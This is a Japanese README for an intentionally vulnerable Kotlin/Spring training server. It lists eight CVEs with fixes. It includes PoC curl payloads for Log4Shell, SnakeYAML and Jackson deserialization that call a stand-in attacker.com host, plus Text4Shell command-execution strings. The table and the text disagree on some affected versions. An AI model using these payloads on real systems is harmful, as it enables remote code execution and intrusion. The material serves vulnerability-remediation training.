# vulnerable-kotlin-server

CVE解消トレーニング用のサーバーサイド Kotlin プロジェクトです。
**本番環境には絶対にデプロイしないでください。**

---

## 含まれる CVE 一覧

| CVE | CVSS | ライブラリ / バージョン | 種別 | 修正バージョン |
|-----|------|------------------------|------|--------------|
| CVE-2021-44228 | **10.0** Critical | log4j-core 2.17.2 | RCE (Log4Shell) | 修正済み |
| CVE-2022-22965 | **9.8** Critical | spring-webmvc 5.3.19 | RCE (Spring4Shell) | 修正済み |
| CVE-2022-1471  | **9.8** Critical | snakeyaml 1.30 | RCE (デシリアライズ) | 2.0+ |
| CVE-2022-45868 | **9.8** Critical | h2 2.1.210 | RCE (コンソール) | 2.1.214+ |
| CVE-2022-42889 | **9.8** Critical | commons-text 1.9 | RCE (Text4Shell) | 1.10.0+ |
| CVE-2021-20190 | **8.1** High | jackson-databind 2.12.3 | RCE (デシリアライズ) | 2.12.7.1+ |
| CVE-2022-22978 | **9.8** Critical | spring-security 5.6.2 | 認可バイパス | 5.6.4+ |
| CVE-2022-25857 | **7.5** High | snakeyaml 1.30 | DoS | 1.32+ |

---

## 各 CVE の詳細

### CVE-2021-44228 — Log4Shell (CVSS 10.0)

**影響ファイル:** `SearchController.kt`、`log4j2.xml`

log4j-core 2.14.1 はメッセージ内の `${jndi:ldap://...}` を評価する。
ユーザー入力をサニタイズせずにログ出力するだけで任意コード実行が発生する。

```bash
# PoC
curl "http://localhost:8080/api/search?query=\${jndi:ldap://attacker.com/exploit}"
```

**修正方法:**
- `build.gradle.kts` の `extra["log4j2.version"]` を `"2.17.2"` に変更
- または JVM フラグ `-Dlog4j2.formatMsgNoLookups=true` を追加

**このブランチでの対応:** `log4j2.version` を `2.17.2` に更新済み。

---

### CVE-2022-22965 — Spring4Shell (CVSS 9.8)

**影響:** Spring Framework 5.3.15 (Spring Boot 2.6.3 に同梱)

Spring MVC のデータバインディング経由で ClassLoader を操作し、
Tomcat 上で任意ファイルを書き込んで RCE が可能。
JDK 9+ かつ WAR デプロイ または Spring WebMVC 利用で発動。

**修正方法:**
- `build.gradle.kts` の Spring Boot バージョンを `"2.6.7"` 以上に変更
  (Spring Boot 2.6.7 では Spring Framework 5.3.19 が同梱される)

**このブランチでの対応:** Spring Boot を `2.6.7` に更新し、Spring Framework `5.3.19` を取り込む。

---

### CVE-2022-1471 — SnakeYAML Constructor (CVSS 9.8)

**影響ファイル:** `YamlController.kt`

`new Yaml().load()` は `!!クラス名` タグで任意クラスをインスタンス化する。

```bash
# PoC
curl -X POST http://localhost:8080/api/yaml/parse \
  -H "Content-Type: text/plain" \
  -d '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]'
```

**修正方法:**
- `extra["snakeyaml.version"]` を `"2.0"` に変更
- または `YamlController.kt` で `new Yaml(new SafeConstructor(new LoaderOptions()))` を使用

---

### CVE-2022-45868 — H2 Console Remote Access (CVSS 9.8)

**影響ファイル:** `application.yml`

`spring.h2.console.settings.web-allow-others=true` により、
ネットワーク経由で H2 コンソール (`/h2-console`) にアクセス可能。
INIT パラメータで OS コマンド実行が可能。

```
# ブラウザで確認
http://localhost:8080/h2-console
# JDBC URL: jdbc:h2:mem:testdb  User: sa  Password: password
```

**修正方法:**
- `application.yml` の `web-allow-others: false` に変更
- `extra["h2.version"]` を `"2.1.214"` に変更

---

### CVE-2022-42889 — Text4Shell (CVSS 9.8)

**影響ファイル:** `TextController.kt`

`StringSubstitutor.createInterpolator()` は `script:` / `dns:` / `url:` の
ルックアップを有効にする。ユーザー入力を直接 `replace()` に渡すと RCE になる。

```bash
# PoC
curl -X POST http://localhost:8080/api/text/process \
  -H "Content-Type: application/json" \
  -d '{"template":"${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}"}'

curl "http://localhost:8080/api/text/render?template=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
```

**修正方法:**
- `build.gradle.kts` の `commons-text` を `"1.10.0"` に変更

---

### CVE-2021-20190 — Jackson Databind Deserialization (CVSS 8.1)

**影響ファイル:** `JacksonConfig.kt`、`UserController.kt`

`enableDefaultTyping(NON_FINAL)` + `@JsonTypeInfo(Id.CLASS)` により、
JSON の `@class` フィールドで任意クラスをデシリアライズ可能。

```bash
# PoC
curl -X POST http://localhost:8080/api/users/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data":["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker.com/x","autoCommit":true}]}'
```

**修正方法:**
- `jackson-databind` を `2.12.7.1` 以上に変更
- `JacksonConfig.kt` から `enableDefaultTyping` を削除
- `PolymorphicTypeValidator` で許可クラスを allowlist 管理する

---

### CVE-2022-22978 — Spring Security Authorization Bypass (CVSS 9.8)

**影響ファイル:** `SecurityConfig.kt`

Spring Security 5.6.2 の `antMatchers` は特定の URL エンコードパターンで
認可チェックをバイパスされる脆弱性がある。

**修正方法:**
- Spring Boot を `"2.7.0"` 以上に変更 (Spring Security 5.7.1 が同梱される)

---

## セットアップ & 起動

```bash
# Java 11 以上が必要
cd vulnerable-kotlin-server

# Gradle Wrapper 生成 (初回のみ)
gradle wrapper --gradle-version 7.3.3

# 起動
./gradlew bootRun
```

## CVE 解消の確認方法

各 CVE を修正後、依存関係を確認:

```bash
# 依存ツリーで脆弱バージョンが残っていないか確認
./gradlew dependencies --configuration runtimeClasspath | grep -E "log4j|snakeyaml|h2|jackson|commons-text|spring"
```
